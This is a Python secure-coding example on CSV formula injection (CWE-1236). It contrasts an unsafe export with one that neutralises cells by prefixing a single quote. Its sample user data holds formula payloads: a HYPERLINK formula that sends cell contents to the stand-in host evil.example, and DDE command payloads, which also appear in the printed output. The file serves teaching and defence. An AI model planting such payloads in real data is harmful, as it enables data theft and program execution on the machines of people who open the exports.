"""CWE-1236: CSV formula injection — exported cells that start with = run

https://cwe.mitre.org/data/definitions/1236.html

An admin exports the user table to CSV and opens it in a spreadsheet. Any
cell that begins with =, +, -, @ (or a tab/CR before them) is evaluated as a
formula: =HYPERLINK() sends the neighbouring cells to an attacker's server
when clicked, older DDE payloads such as =cmd|' /C calc'!A0 ran programs, and
=IMPORTXML() in hosted spreadsheets fetches URLs on open. The csv module is
not the problem and quoting does not help: "=1+1" in quotes is still a
formula once the spreadsheet parses the field.

Neutralise untrusted *text* cells on export by prefixing a single quote
(OWASP's recommendation) when the first character is one of = + - @ TAB CR.
Leave real numeric columns as numbers, otherwise legitimate -5 becomes '-5.
The "spreadsheet" column below is a crude model of what the cell would do.
"""

import csv
import io

TRIGGERS = ("=", "+", "-", "@", "\t", "\r")
USERS = [
    ("ada", "Ada Lovelace", -5),
    ("eve", '=HYPERLINK("https://evil.example/?d="&A2&B2,"Click for details")', 0),
    ("mal", "=cmd|' /C calc'!A0", 0),
    ("sam", "@SUM(1+1)*cmd|' /C calc'!A0", 0),
    ("tab", "\t=1+1", 0),
    ("neg", "-2+3", 0),
]


def spreadsheet_view(cell: str) -> str:
    stripped = cell.lstrip("\t\r ")
    if cell.startswith("'"):
        return "text"
    if stripped[:1] in ("=", "+", "-", "@") and not stripped.lstrip("+-").replace(".", "").isdigit():
        return "FORMULA"
    return "text/number"


def noncompliant(rows) -> str:
    out = io.StringIO()
    w = csv.writer(out, quoting=csv.QUOTE_ALL, lineterminator="\n")   # quoting does not help
    w.writerow(["login", "display_name", "balance"])
    w.writerows(rows)
    return out.getvalue()


def neutralise(value):
    if isinstance(value, str) and value.startswith(TRIGGERS):
        return "'" + value
    return value


def compliant(rows) -> str:
    out = io.StringIO()
    w = csv.writer(out, lineterminator="\n")
    w.writerow(["login", "display_name", "balance"])
    for login, name, balance in rows:
        w.writerow([neutralise(login), neutralise(name), balance])  # balance stays numeric
    return out.getvalue()


def show(title: str, text: str) -> None:
    print(title)
    for row in list(csv.reader(io.StringIO(text)))[1:]:
        print(f"  {spreadsheet_view(row[1]):11} {row[1]!r:.70}  balance={row[2]}")


def main() -> None:
    show("noncompliant (QUOTE_ALL):", noncompliant(USERS))
    show("compliant (prefix '):", compliant(USERS))
    print()
    print("compliant file, first data lines:")
    for line in compliant(USERS).splitlines()[:3]:
        print("  " + line)


if __name__ == "__main__":
    main()

# Output:
# noncompliant (QUOTE_ALL):
#   text/number 'Ada Lovelace'  balance=-5
#   FORMULA     '=HYPERLINK("https://evil.example/?d="&A2&B2,"Click for details")'  balance=0
#   FORMULA     "=cmd|' /C calc'!A0"  balance=0
#   FORMULA     "@SUM(1+1)*cmd|' /C calc'!A0"  balance=0
#   FORMULA     '\t=1+1'  balance=0
#   FORMULA     '-2+3'  balance=0
# compliant (prefix '):
#   text/number 'Ada Lovelace'  balance=-5
#   text        '\'=HYPERLINK("https://evil.example/?d="&A2&B2,"Click for details")'  balance=0
#   text        "'=cmd|' /C calc'!A0"  balance=0
#   text        "'@SUM(1+1)*cmd|' /C calc'!A0"  balance=0
#   text        "'\t=1+1"  balance=0
#   text        "'-2+3"  balance=0
#
# compliant file, first data lines:
#   login,display_name,balance
#   ada,Ada Lovelace,-5
#   eve,"'=HYPERLINK(""https://evil.example/?d=""&A2&B2,""Click for details"")",0
